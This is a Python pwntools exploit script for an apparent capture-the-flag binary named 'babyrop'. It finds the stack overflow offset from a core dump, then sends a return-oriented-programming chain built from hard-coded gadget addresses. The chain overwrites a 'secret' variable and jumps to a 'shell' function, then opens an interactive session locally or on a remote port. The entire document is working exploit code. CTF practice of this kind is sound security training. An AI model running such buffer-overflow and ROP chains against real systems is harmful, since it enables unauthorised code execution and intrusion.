from pwn import *

binary = "./babyrop"

p = ELF(binary)

io = process([binary])
io.sendline(cyclic(512))
io.wait()


#0x08066f9c: pop edx; mov eax, 0x16; pop ebx; pop esi; ret;
#0x080b63ba: pop eax; ret;
#0x0805f812: mov dword ptr [edx], eax; ret;

shell = p.functions['shell'].address
info("Shell address : %hx",shell)
secret = p.symbols['secret']
info("secret address : %hx",secret)


core = Coredump("/tmp/core.%s" % io.pid)
info("eip = %#x", core.eip)
offset = cyclic_find(core.eip)
info("rip offset is = %d", offset)

addr_pop1 = 0x08066f9c
addr_pop2 = 0x080b63ba
addr_mov_pop1_pop_2_ret = 0x0805f812

payload = b'A'*offset+p32(addr_pop1)+p32(secret)+b'A'*8+p32(addr_pop2)+p32(0xC0FFEE11)+p32(addr_mov_pop1_pop_2_ret)+p32(shell)

#payload = b'A'*20+p32(0x080491b6)

info("Payload:\n"+hexdump(payload))

if args['REMOTE']:
	io = remote(args['REMOTE'],50003)
else:
	io = p.process()
	#io = p.debug()
io.sendline(payload)
#io.sendline("cat flag")
io.interactive()
